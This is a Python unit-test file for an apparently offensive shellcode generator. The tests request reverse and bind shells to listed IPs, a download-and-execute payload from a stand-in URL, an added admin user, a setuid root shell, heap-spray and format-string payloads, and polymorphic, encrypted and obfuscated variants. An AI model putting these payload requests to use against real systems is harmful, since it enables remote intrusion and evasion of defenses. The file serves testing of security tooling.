"""
Unit tests for Shellcode Generator with REAL shellcode generation.
Tests REAL shellcode creation for various architectures and purposes.
NO MOCKS - ALL TESTS USE REAL SHELLCODE AND PRODUCE REAL RESULTS.
"""

import pytest
from pathlib import Path

from intellicrack.core.exploitation.shellcode_generator import ShellcodeGenerator
from tests.base_test import IntellicrackTestBase


class TestShellcodeGenerator(IntellicrackTestBase):
    """Test shellcode generation with REAL shellcode."""
    
    @pytest.fixture(autouse=True)
    def setup(self):
        """Set up test with real shellcode generator."""
        self.generator = ShellcodeGenerator()
        
    def test_x86_shellcode_generation(self):
        """Test x86 shellcode generation."""
        shellcode = self.generator.generate_x86_shellcode(
            payload_type='bind_shell',
            port=4444
        )
        
        self.assert_real_output(shellcode)
        assert isinstance(shellcode, bytes)
        assert len(shellcode) > 0
        
        # Validate x86 shellcode characteristics
        assert len(shellcode) < 1024  # Reasonable size
        
        # Check for common x86 instructions
        # xor eax, eax (31 C0)
        # push/pop instructions
        assert any(b in shellcode for b in [b'\x31\xc0', b'\x50', b'\x58'])
        
    def test_x64_shellcode_generation(self):
        """Test x64 shellcode generation."""
        shellcode = self.generator.generate_x64_shellcode(
            payload_type='reverse_shell',
            host='127.0.0.1',
            port=4444
        )
        
        self.assert_real_output(shellcode)
        assert isinstance(shellcode, bytes)
        assert len(shellcode) > 0
        
        # x64 shellcode is typically larger
        assert len(shellcode) > 50
        
        # Check for x64 specific patterns
        # REX prefixes (0x48-0x4F)
        rex_prefixes = [b for b in shellcode if 0x48 <= b <= 0x4F]
        assert len(rex_prefixes) > 0  # Should have REX prefixes
        
    def test_null_free_shellcode(self):
        """Test null-free shellcode generation."""
        shellcode = self.generator.generate_null_free_shellcode(
            architecture='x86',
            payload_type='exec_cmd',
            command='calc.exe'
        )
        
        self.assert_real_output(shellcode)
        assert b'\x00' not in shellcode  # No null bytes
        assert len(shellcode) > 0
        
    def test_alphanumeric_shellcode(self):
        """Test alphanumeric shellcode encoding."""
        original = self.generator.generate_x86_shellcode(
            payload_type='messagebox',
            message='Test'
        )
        
        encoded = self.generator.encode_alphanumeric(original)
        
        self.assert_real_output(encoded)
        assert isinstance(encoded, bytes)
        
        # Check all bytes are alphanumeric
        for byte in encoded:
            assert (0x30 <= byte <= 0x39 or  # 0-9
                    0x41 <= byte <= 0x5A or  # A-Z
                    0x61 <= byte <= 0x7A)    # a-z
                    
    def test_shellcode_encoding(self):
        """Test various shellcode encoding methods."""
        original = self.generator.generate_x86_shellcode(
            payload_type='bind_shell',
            port=8080
        )
        
        # XOR encoding
        xor_encoded = self.generator.encode_xor(original, key=0xAA)
        self.assert_real_output(xor_encoded)
        assert len(xor_encoded) > len(original)  # Includes decoder stub
        
        # ROT13 encoding
        rot_encoded = self.generator.encode_rot13(original)
        assert len(rot_encoded) > len(original)
        
        # Custom encoding
        custom_encoded = self.generator.encode_custom(original)
        assert len(custom_encoded) > 0
        
    def test_egg_hunter_shellcode(self):
        """Test egg hunter shellcode generation."""
        egg = b'W00TW00T'
        hunter = self.generator.generate_egg_hunter(egg, architecture='x86')
        
        self.assert_real_output(hunter)
        assert isinstance(hunter, bytes)
        assert len(hunter) < 50  # Egg hunters are small
        assert egg[:4] in hunter  # Should contain part of egg
        
    def test_staged_shellcode(self):
        """Test staged shellcode generation."""
        # Stage 1 - Small stager
        stager = self.generator.generate_stager(
            architecture='x86',
            stage2_size=1024
        )
        
        self.assert_real_output(stager)
        assert len(stager) < 200  # Stagers are small
        
        # Stage 2 - Full payload
        stage2 = self.generator.generate_stage2(
            payload_type='meterpreter',
            architecture='x86'
        )
        
        assert len(stage2) > 500  # Full payloads are larger
        
    def test_polymorphic_shellcode(self):
        """Test polymorphic shellcode generation."""
        # Generate same payload multiple times
        shellcodes = []
        for _ in range(5):
            sc = self.generator.generate_polymorphic(
                payload_type='bind_shell',
                port=4444,
                architecture='x86'
            )
            shellcodes.append(sc)
            
        # All should be different
        self.assert_real_output(shellcodes)
        for i in range(len(shellcodes)):
            for j in range(i + 1, len(shellcodes)):
                assert shellcodes[i] != shellcodes[j]
                
        # But all should have similar size
        sizes = [len(sc) for sc in shellcodes]
        assert max(sizes) - min(sizes) < 50
        
    def test_bad_character_avoidance(self):
        """Test shellcode generation avoiding bad characters."""
        bad_chars = b'\x00\x0a\x0d\x20'
        
        shellcode = self.generator.generate_avoiding_chars(
            payload_type='reverse_shell',
            host='192.168.1.100',
            port=4444,
            bad_chars=bad_chars,
            architecture='x86'
        )
        
        self.assert_real_output(shellcode)
        
        # Verify no bad characters
        for bad in bad_chars:
            assert bytes([bad]) not in shellcode
            
    def test_windows_shellcode_payloads(self):
        """Test Windows-specific shellcode payloads."""
        # WinExec payload
        winexec = self.generator.generate_winexec_shellcode(
            command='notepad.exe',
            architecture='x86'
        )
        
        self.assert_real_output(winexec)
        assert len(winexec) > 0
        
        # Download & Execute
        download_exec = self.generator.generate_download_exec(
            url='http://example.com/payload.exe',
            architecture='x64'
        )
        
        assert len(download_exec) > 100  # Complex payload
        
        # Add user payload
        add_user = self.generator.generate_add_user(
            username='testuser',
            password='Test123!',
            architecture='x86'
        )
        
        assert len(add_user) > 0
        
    def test_linux_shellcode_payloads(self):
        """Test Linux-specific shellcode payloads."""
        # Reverse shell
        reverse = self.generator.generate_linux_reverse_shell(
            host='10.0.0.1',
            port=1337,
            architecture='x64'
        )
        
        self.assert_real_output(reverse)
        assert len(reverse) > 0
        
        # Bind shell  
        bind = self.generator.generate_linux_bind_shell(
            port=8888,
            architecture='x86'
        )
        
        assert len(bind) > 0
        
        # setuid(0) + execve
        root_shell = self.generator.generate_setuid_shell(
            architecture='x64'
        )
        
        assert len(root_shell) > 0
        
    def test_shellcode_optimization(self):
        """Test shellcode size optimization."""
        # Generate unoptimized
        unoptimized = self.generator.generate_x86_shellcode(
            payload_type='exec_cmd',
            command='cmd.exe',
            optimize=False
        )
        
        # Generate optimized
        optimized = self.generator.generate_x86_shellcode(
            payload_type='exec_cmd', 
            command='cmd.exe',
            optimize=True
        )
        
        self.assert_real_output(optimized)
        
        # Optimized should be smaller
        assert len(optimized) < len(unoptimized)
        
    def test_shellcode_obfuscation(self):
        """Test shellcode obfuscation techniques."""
        original = self.generator.generate_x86_shellcode(
            payload_type='messagebox',
            message='Hello'
        )
        
        # Dead code insertion
        obfuscated = self.generator.obfuscate_dead_code(original)
        assert len(obfuscated) > len(original)
        
        # Instruction substitution
        substituted = self.generator.obfuscate_substitution(original)
        assert len(substituted) >= len(original)
        
        # Control flow obfuscation
        flow_obf = self.generator.obfuscate_control_flow(original)
        self.assert_real_output(flow_obf)
        assert len(flow_obf) > len(original)
        
    def test_format_string_shellcode(self):
        """Test format string exploit shellcode."""
        # Generate format string payload
        fmt_shellcode = self.generator.generate_format_string_payload(
            target_addr=0x08049000,
            write_value=0x41414141,
            offset=7
        )
        
        self.assert_real_output(fmt_shellcode)
        assert b'%' in fmt_shellcode  # Format specifiers
        assert len(fmt_shellcode) > 0
        
    def test_heap_spray_shellcode(self):
        """Test heap spray shellcode generation."""
        spray = self.generator.generate_heap_spray(
            shellcode_size=200,
            spray_size=0x100000,  # 1MB
            slide_size=0x1000
        )
        
        self.assert_real_output(spray)
        assert len(spray) >= 0x100000
        
        # Should contain NOP slides
        assert b'\x90' * 100 in spray  # NOP slides
        
    def test_rop_chain_shellcode(self):
        """Test ROP chain compatible shellcode."""
        rop_shellcode = self.generator.generate_rop_compatible(
            payload_type='reverse_shell',
            host='10.10.10.10',
            port=443,
            architecture='x86'
        )
        
        self.assert_real_output(rop_shellcode)
        
        # Should be position independent
        assert len(rop_shellcode) > 0
        
    def test_shellcode_encryption(self):
        """Test shellcode encryption methods."""
        original = self.generator.generate_x86_shellcode(
            payload_type='bind_shell',
            port=9999
        )
        
        # AES encryption
        aes_encrypted = self.generator.encrypt_aes(
            original,
            key=b'0123456789ABCDEF'
        )
        assert len(aes_encrypted) > len(original)
        
        # RC4 encryption
        rc4_encrypted = self.generator.encrypt_rc4(
            original,
            key=b'MySecretKey'
        )
        self.assert_real_output(rc4_encrypted)
        assert len(rc4_encrypted) > len(original)
        
    def test_multi_architecture_shellcode(self):
        """Test multi-architecture shellcode generation."""
        # ARM shellcode
        arm_shell = self.generator.generate_arm_shellcode(
            payload_type='reverse_shell',
            host='192.168.0.1',
            port=4444
        )
        
        self.assert_real_output(arm_shell)
        assert len(arm_shell) > 0
        
        # MIPS shellcode
        mips_shell = self.generator.generate_mips_shellcode(
            payload_type='bind_shell',
            port=1234
        )
        
        assert len(mips_shell) > 0
        
    def test_shellcode_validation(self):
        """Test shellcode validation and analysis."""
        shellcode = self.generator.generate_x86_shellcode(
            payload_type='exec_cmd',
            command='calc.exe'
        )
        
        # Validate shellcode
        validation = self.generator.validate_shellcode(shellcode, 'x86')
        
        self.assert_real_output(validation)
        assert validation['valid'] == True
        assert 'warnings' in validation
        assert 'analysis' in validation
        
        # Check for common issues
        assert 'null_bytes' in validation['analysis']
        assert 'bad_chars' in validation['analysis']
        assert 'size' in validation['analysis']